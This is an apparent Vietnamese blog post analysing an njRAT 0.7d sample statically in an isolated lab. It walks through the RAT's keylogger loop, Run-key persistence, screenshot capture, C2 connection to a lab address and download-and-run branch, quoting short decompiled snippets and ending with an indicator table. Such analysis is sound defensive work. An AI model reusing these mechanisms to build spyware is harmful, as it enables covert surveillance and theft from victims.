---
title: "Vạch Trần njRAT 0.7d Qua Từng Dấu Vết Trong Mã Nguồn"
permalink: /posts/njrat-static-analysis/
redirect_from:
  - /posts/phan-tich-ma-doc-co-ban/
date: 2026-10-21 21:00:00 +0700
categories: [Malware Analysis, Reverse Engineering]
tags: [malware, njrat, reverse-engineering, static-analysis, pestudio, detect-it-easy, dnspy, dotnet]
description: "Khảo sát chi tiết mã độc gián điệp njRAT 0.7d (malware_blt.exe) bằng phân tích tĩnh: từ bóc tách PE header, metadata đến dịch ngược logic keylogger, chụp màn hình, persistence và kết nối C2 bằng dnSpy."
image:
  path: /assets/images/posts/malware/nhan-dien.png
  alt: "Vạch trần njRAT 0.7d qua từng dấu vết trong mã nguồn"
toc: true
comments: true
mermaid: true
---

> **Phân tích tĩnh nâng cao trên biến thể njRAT 0.7d (`malware_blt.exe`)**  
> **Mục tiêu:** Vạch trần toàn diện cấu trúc nội bộ, cơ chế lẩn tránh, module gián điệp và cấu hình Command & Control (C2) hoàn toàn bằng **phương pháp phân tích tĩnh (Static Analysis)** mà không cần kích hoạt mẫu vật.  
> **Bộ công cụ sử dụng:** Detect It Easy (DiE) · PeStudio · dnSpy (.NET Decompiler) · VMware Workstation (Isolated Host-Only Network).

Một file thực thi chỉ khoảng **32 KB** có thể làm được những gì? Với mẫu `malware_blt.exe` này, câu trả lời dần hiện ra khi mình mở từng lớp bên trong: đọc bàn phím, chụp màn hình, tự khởi động cùng Windows và kết nối về máy chủ điều khiển.

Nhưng mình không muốn dừng ở việc thấy công cụ an ninh gắn nhãn njRAT rồi chấp nhận kết luận đó. Điều mình muốn biết là **những chức năng ấy nằm ở đâu trong file, đoạn mã nào trực tiếp thực hiện chúng và các dấu vết kỹ thuật có liên kết logic với nhau hay không**.

Mình bắt đầu từ việc giải phẫu cấu trúc file PE, lần qua những chuỗi và API đáng ngờ, sau đó dùng dnSpy để dịch ngược và kiểm tra mã nguồn. Toàn bộ quá trình dưới đây là phân tích tĩnh trong môi trường máy ảo cô lập có thiết lập Clean Snapshot; do đó những gì được xác nhận ở đây là chức năng có sẵn trong mã, chưa phải hành vi khi chạy thực tế.

![Thiết lập Clean Snapshot trên máy ảo trước khi phân tích](/assets/images/posts/malware/snapshot.png)
_Hình 1 — Thiết lập snapshot sạch (Clean Snapshot) trên VMware Workstation để sẵn sàng hoàn tác môi trường phân tích bất cứ lúc nào._

---

## 1. Nhận diện mẫu và tìm hướng phân tích

Trước khi đi sâu vào từng hàm cụ thể, mình cần biết file được xây dựng trên nền tảng nào và mức độ tiếp cận phần mã bên trong tới đâu.

### 1.1. Nhận diện PE32 và nền tảng VB.NET

Sử dụng **Detect It Easy (DiE)** để kiểm tra định dạng tệp và chữ ký biên dịch:

![Detect It Easy nhận diện định dạng PE32 và dấu hiệu VB.NET](/assets/images/posts/malware/nhan-dien.png)
_Hình 2 — Detect It Easy nhận diện định dạng PE32 và dấu hiệu biên dịch bằng Microsoft Visual Basic .NET._

Ở kết quả phân tích của Detect It Easy, mẫu được nhận diện là **PE32 (32-bit executable GUI)**, có dấu hiệu rõ ràng được viết bằng **VB.NET**. Chi tiết này giúp mình định hình hướng đi rất nhanh: đây là một ứng dụng chạy trên nền .NET CLR (Common Language Runtime). Vì vậy, thay vì phải dịch ngược mã máy x86 phức tạp bằng Disassembler, mình có thể dùng công cụ dịch ngược IL như **dnSpy** để tái tạo mã nguồn gần như nguyên bản.

### 1.2. Kiểm tra section và dấu hiệu đóng gói

Tiếp tục đánh giá cấu trúc các phân vùng PE và độ hỗn loạn dữ liệu (Entropy):

![Các section và thông số entropy của mẫu](/assets/images/posts/malware/section-entropy.png)
_Hình 3 — Các section và thông số entropy của mẫu phân tích._

Phân tích section chưa cho thấy dấu hiệu đóng gói (packer) hay mã hóa phức tạp:
- Các section đều có entropy dưới mức **6.0** (ngưỡng nén hoặc mã hóa thường trên 7.0).
- DiE không phát hiện bất kỳ packer phổ biến nào (như UPX, Themida, VMProtect).

Điều này cho thấy mã chương trình và tài nguyên nằm ở dạng nguyên bản, giúp việc tiếp cận metadata và các chuỗi text trong file thuận lợi hơn rất nhiều.

### 1.3. Lần ra tên module gốc trong metadata

Mở mẫu vật trong **PeStudio** để soi các trường siêu dữ liệu nội bộ:

![PeStudio hiển thị metadata cùng tên module Stub.exe](/assets/images/posts/malware/pe-metadata.png)
_Hình 4 — PeStudio hiển thị metadata cùng tên module gốc Stub.exe._

Một chi tiết quan trọng xuất hiện ở đây là tên module gốc: **`Stub.exe`**. File mình đang phân tích có tên là `malware_blt.exe`, nhưng trường `Original Filename` trong PE metadata vẫn giữ tên `Stub.exe`. Dấu vết này cho thấy file đã được đổi tên sau khi biên dịch từ một trình tạo mã độc (Malware Builder) dạng Client-Stub.

Kết quả quét VirusTotal ghi nhận trong tài liệu phân tích là **58/71** engine bảo mật đánh dấu mẫu độc hại với các định danh như `Trojan.njRAT`, `Backdoor.Bladabindi`. Con số ấy củng cố hướng điều tra, còn để hiểu cơ chế hoạt động thực sự, mình phải đi sâu vào mã nguồn.

---

## 2. Gom những đầu mối đầu tiên

### 2.1. API bàn phím gợi mở nghi vấn keylogger

Kiểm tra danh sách hàm Import trong PeStudio:

![Nhóm API liên quan bàn phím và cửa sổ trong PeStudio](/assets/images/posts/malware/api-ban-phim.png)
_Hình 5 — Nhóm API liên quan đến bàn phím và cửa sổ xuất hiện trong PeStudio._

Trong PeStudio, nhóm hàm Win32 API liên quan đến bàn phím và trạng thái cửa sổ nổi lên rất rõ rệt:
- `GetAsyncKeyState`: Thăm dò trạng thái vật lý của từng phím bấm.
- `GetKeyboardState`: Lấy trạng thái của toàn bộ 256 phím ảo.
- `GetForegroundWindow`: Lấy handle của cửa sổ đang kích hoạt (active window).

Đứng riêng lẻ, những API này vẫn có thể xuất hiện trong các phần mềm tiện ích hợp pháp. Nhưng khi xuất hiện đồng thời trong một file 32 KB, chúng mở ra một giả thuyết kỹ thuật rõ ràng: **chương trình có khả năng ghi lại thao tác phím (keylogger) và gắn kèm ngữ cảnh ứng dụng người dùng đang tương tác**.

### 2.2. Trích xuất cấu hình mạng và dấu vết tự khởi động

Sử dụng tính năng trích xuất chuỗi (Strings) để tìm các đầu mối cấu hình:

![Các chuỗi trích xuất chứa IP, cổng, tên file và đường dẫn Registry](/assets/images/posts/malware/cau-hinh.png)
_Hình 6 — Các chuỗi trích xuất chứa IP, cổng kết nối, tên file ngụy trang và đường dẫn Registry._

Những chuỗi nổi bật bao gồm:
- Địa chỉ IP: `172.20.0.20`
- Cổng dịch vụ: `1177`
- Tên tệp ngụy trang: `WindowsServices.exe`
- Khóa Registry tự khởi động: `Software\Microsoft\Windows\CurrentVersion\Run`

IP và cổng chỉ ra địa chỉ máy chủ C2 mà mã độc sẽ hướng về. Tên `WindowsServices.exe` tạo cảm giác giống một tiến trình hệ thống để đánh lừa người dùng. Đường dẫn khóa `Run` là cơ chế bám trụ kinh điển trên hệ điều hành Windows.

> **Lưu ý về môi trường thử nghiệm:** Địa chỉ `172.20.0.20` là IP nội bộ thuộc dải mạng Host-only cô lập (`VMnet0 Custom 172.20.0.0/24`) của phòng lab, không phải IP công khai trên Internet.

![Cấu hình mạng Host-only cách ly VMnet0 phục vụ lab phân tích mã độc](/assets/images/posts/malware/lab.png)
_Hình 7 — Mạng ảo nội bộ VMnet0 (172.20.0.0/24) trên VMware Virtual Network Editor giúp cô lập lưu lượng của mẫu vật an toàn._

---

## 3. Dịch ngược cơ chế khởi tạo và bám trụ

Từ những từ khóa và đầu mối thu thập được ở bước phân tích cơ bản, mình đưa file vào **dnSpy** để phân tích luồng thực thi trong mã nguồn VB.NET.

### 3.1. Theo luồng khởi tạo và kiểm tra Mutex

Hàm `main()` của chương trình rất ngắn gọn, chỉ làm nhiệm vụ khởi tạo rồi chuyển giao luồng xử lý chính sang `OK.ko()`. 

![Đoạn mã tạo Mutex và kiểm tra instance đang chạy](/assets/images/posts/malware/mutex.png)
_Hình 8 — Đoạn mã khởi tạo Mutex và kiểm tra instance đang chạy trong dnSpy._

Trong hàm khởi tạo, chương trình tạo một đối tượng **Mutex** với tên lấy từ biến cấu hình `OK.RG`:
```visualbasic
OK.mtx = New Mutex(False, OK.RG, flag)
If Not flag Then
    ProjectData.EndApp()
End If
```
Nếu `flag` trả về `False` (tức Mutex đã tồn tại do một tiến trình njRAT khác đang chạy trên máy), chương trình sẽ gọi ngay `ProjectData.EndApp()` để tự kết thúc.

Cơ chế này giúp mã độc tránh việc chạy đè nhiều bản sao trên cùng một máy nạn nhân, giảm thiểu nguy cơ bị người quản trị phát hiện do chiếm dụng tài nguyên bất thường.

### 3.2. Đối chiếu Registry Run và thư mục Startup

Tìm kiếm chuỗi `Software\Microsoft\Windows\CurrentVersion\Run` trong dnSpy dẫn thẳng tới hàm cài đặt **`INS()`**:

![Đối chiếu chuỗi Registry Run với biến cấu hình và hàm INS](/assets/images/posts/malware/registry-run.png)
_Hình 9 — Đối chiếu chuỗi Registry Run với biến cấu hình và hàm cài đặt bám trụ INS()._

Đoạn mã trong hàm `INS()` xác nhận logic bám trụ (Persistence) rất bài bản:
1. Sao chép file thực thi hiện tại vào thư mục người dùng dưới tên ngụy trang `WindowsServices.exe`.
2. Ghi một giá trị vào Registry tại khóa `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
3. Nếu có quyền quản trị, mã độc tiếp tục ghi thêm vào nhánh `HKEY_LOCAL_MACHINE`.
4. Ngoài ra còn sao chép shortcut vào thư mục `Startup` của Windows Menu.

Nhờ những điểm kích hoạt này, mỗi khi người dùng đăng nhập vào hệ thống, Windows sẽ tự động nạp `WindowsServices.exe` chạy ngầm.

---

## 4. Làm rõ khả năng giám sát người dùng

### 4.1. Theo dõi phím bấm và cửa sổ đang hoạt động

Quay lại nhóm API bàn phím đã phát hiện trong PeStudio, mình lần theo các điểm gọi trong dnSpy và tìm thấy hàm **`WRK()`**:

![Hàm WRK đọc trạng thái phím và nối dữ liệu vào Logs](/assets/images/posts/malware/keylogger.png)
_Hình 10 — Hàm WRK() quét mã phím qua GetAsyncKeyState và định dạng lưu vào biến Logs._

Ở đây, toàn bộ logic của keylogger được phơi bày rõ ràng:
- Một vòng lặp vô tận quét qua các mã phím ảo (từ 0 đến 255) bằng `GetAsyncKeyState`.
- Khi phát hiện phím được nhấn, mã độc kiểm tra trạng thái Shift, CapsLock để chuyển thành ký tự hoa/thường chuẩn xác.
- Gọi hàm **`AV()`** để lấy tiêu đề cửa sổ đang làm việc hiện tại (`GetForegroundWindow` + `GetWindowText`).
- Nếu người dùng chuyển sang cửa sổ mới, mã độc sẽ chèn một dòng tiêu đề định dạng:  
  `[dd/MM/yyyy HH:mm:ss Title]`  
  rồi nối toàn bộ phím gõ phía sau vào chuỗi đệm **`Logs`**.

![Sơ đồ luồng hoạt động của hàm ghi phím WRK](/assets/images/posts/malware/flowchart-keylogger-wrk.png)
_Hình 11 — Sơ đồ luồng xử lý chi tiết của hàm quét phím WRK() và hàm lấy thông tin cửa sổ AV()._

Nhờ gắn kèm tiêu đề cửa sổ, kẻ tấn công dễ dàng phân loại được đâu là tài khoản nhập trên trình duyệt web, đâu là tin nhắn chat hay câu lệnh trong terminal.

### 4.2. Chụp màn hình và kiểm tra ảnh trùng lặp

Tiếp tục rà soát các hàm đồ họa trong mã nguồn, mình phát hiện cơ chế chụp màn hình trong lớp điều khiển:

![Các đoạn mã xử lý ảnh chụp màn hình và so sánh MD5](/assets/images/posts/malware/chup-man-hinh.png)
_Hình 12 — Logic chụp màn hình bằng CopyFromScreen, nén JPEG và tối ưu bằng băm MD5._

Đoạn mã chụp màn hình sử dụng các lớp chuẩn của .NET Framework:
- Tạo một đối tượng `Bitmap` với kích thước tương ứng độ phân giải màn hình (`Screen.PrimaryScreen.Bounds`).
- Dùng `Graphics.CopyFromScreen()` để sao chép toàn bộ pixel hiển thị trên màn hình máy tính.
- Nén hình ảnh thành định dạng **JPEG** để tiết kiệm băng thông.

Đặc biệt, mã độc tính toán **mã băm MD5** của ảnh vừa chụp và so sánh với MD5 của bức ảnh trước đó:
```visualbasic
Dim hash As String = OK.GetHash(stream.ToArray())
If hash = OK.lastScreenHash Then
    ' Không gửi nếu nội dung màn hình không có gì thay đổi
    Return
End If
OK.lastScreenHash = hash
```
Nếu màn hình tĩnh (người dùng không thao tác gì), mã độc sẽ bỏ qua không gửi dữ liệu. Đây là kỹ thuật tối ưu băng thông mạng giúp kết nối ngầm khó bị phát hiện bởi các công cụ giám sát lưu lượng.

---

## 5. Lần theo kênh điều khiển từ xa (C2)

### 5.1. Nối cấu hình host và port với mã kết nối TCP

Các chuỗi `172.20.0.20` và `1177` được tham chiếu trực tiếp tại nhánh khởi tạo kết nối mạng:

![Nhánh kết nối sử dụng TcpClient cùng các biến OK.H và OK.P](/assets/images/posts/malware/ket-noi-c2.png)
_Hình 13 — Nhánh kết nối socket sử dụng TcpClient cùng cấu hình OK.H và OK.P._

Hàm mạng khởi tạo một đối tượng `System.Net.Sockets.TcpClient` và gọi phương thức kết nối:
```visualbasic
OK.C = New TcpClient()
OK.C.Connect(OK.H, Conversions.ToInteger(OK.P))
```
Trong đó, `OK.H = "172.20.0.20"` và `OK.P = "1177"`. 

Sau khi kết nối TCP thành công, mã độc gửi gói tin "bắt tay" (handshake) chứa thông tin ban đầu của nạn nhân lên C2 Server: Tên máy (`PC`), Tên người dùng (`User`), Hệ điều hành, Phiên bản RAT (`0.7d`) và biểu tượng cờ quốc gia.

### 5.2. Phân tích nhánh tải và thực thi file

Bên cạnh việc truyền dữ liệu đánh cắp về server, njRAT còn có một bộ lắng nghe và thực thi lệnh từ xa. Trong đó nhánh tải và chạy file thứ cấp thể hiện rõ năng lực mở rộng:

![Chuỗi thao tác tải dữ liệu, ghi file tạm và khởi chạy](/assets/images/posts/malware/tai-va-chay-file.png)
_Hình 14 — Nhánh xử lý lệnh tải payload từ URL, lưu file tạm và khởi chạy qua Process.Start._

Khi nhận được lệnh tương ứng từ C2, mã độc thực thi chuỗi hành động sau:
1. Dùng `WebClient.DownloadData(url)` để tải tệp thực thi từ đường link do kẻ tấn công chỉ định.
2. Tạo đường dẫn file tạm trong thư mục `%TEMP%` bằng `Path.GetTempFileName()`.
3. Ghi dữ liệu nhị phân xuống ổ đĩa qua `File.WriteAllBytes()`.
4. Gọi `Process.Start()` để kích hoạt tệp mới.

Điều này chứng minh biến thể này không chỉ giới hạn ở khả năng do thám mà còn đóng vai trò là một **Trojan Downloader**, sẵn sàng thả thêm mã độc tống tiền (Ransomware) hoặc công cụ khai thác sâu hơn vào mạng nội bộ.

---

## 6. Ghép lại bức tranh hoạt động của njRAT

### 6.1. Dấu vết kiểm tra Antivirus và gỡ bỏ cài đặt

Trong các hàm hỗ trợ hệ thống, mình phát hiện thêm hai chi tiết đáng chú ý:

1. **Thăm dò giải pháp phòng thủ**: Mã độc thực thi truy vấn WMI:
   ```sql
   Select * From AntiVirusProduct
   ```
   tới namespace `root\SecurityCenter` hoặc `root\SecurityCenter2` để lấy tên phần mềm diệt virus đang được cài đặt trên máy nạn nhân và gửi báo cáo về bảng điều khiển C2.

2. **Chức năng tự hủy (Self-Uninstall)** trong hàm `UNS()`: Khi nhận lệnh gỡ bỏ, mã độc xóa khóa Registry tại mục Run, kết thúc tiến trình và gọi script xóa chính file thực thi để xóa sạch dấu vết.

### 6.2. Bảng tổng hợp IoC trích xuất từ mẫu vật

Dưới đây là các chỉ số thỏa hiệp (Indicators of Compromise) đã được xác minh trực tiếp từ mã nguồn:

| Thành phần | Chi tiết kỹ thuật |
|---|---|
| **Tên tệp ban đầu** | `malware_blt.exe` (Module gốc: `Stub.exe`) |
| **Kích thước** | `32.768 bytes` (~32 KB) |
| **Loại tệp** | PE32 Executable, Microsoft Visual Basic .NET |
| **C2 Server (Lab)** | `172.20.0.20:1177` (Giao thức TCP thô) |
| **Tên Mutex** | Lấy từ biến cấu hình `OK.RG` |
| **Vị trí Persistence** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| **Tên tệp ngụy trang** | `WindowsServices.exe` (Sao chép vào User Profile) |
| **Các API nhạy cảm** | `GetAsyncKeyState`, `GetKeyboardState`, `GetForegroundWindow` |
| **Cơ chế thu thập** | Giám sát phím gõ có gắn kèm Window Title; Chụp màn hình so khớp MD5 |
| **Truy vấn WMI** | `Select * From AntiVirusProduct` |

### 6.3. Những gì có thể kết luận từ mã nguồn

Từ một file thực thi nhỏ bé 32 KB, quá trình phân tích tĩnh đã dẫn mình qua một chuỗi logic chặt chẽ và nhất quán:
1. Nhận diện kiến trúc .NET giúp chọn đúng công cụ dịch ngược dnSpy.
2. Các API bàn phím dẫn thẳng tới vòng lặp bắt phím và bộ đệm nhật ký trong hàm `WRK()`.
3. Chuỗi Registry Run và tên `WindowsServices.exe` dẫn tới cơ chế bám trụ trong hàm `INS()`.
4. Cấu hình IP/Port dẫn tới đối tượng `TcpClient` thực hiện kết nối C2 chủ động.
5. Nhánh `DownloadData` và `Process.Start` làm rõ khả năng tải và chạy payload thứ cấp theo lệnh.

Việc đọc trực tiếp mã nguồn dịch ngược không chỉ giúp mình khẳng định chính xác nhãn nhận diện **njRAT 0.7d**, mà quan trọng hơn là hiểu rõ **cách mã độc được thiết kế, vận hành và che giấu danh tính** trên hệ điều hành Windows.
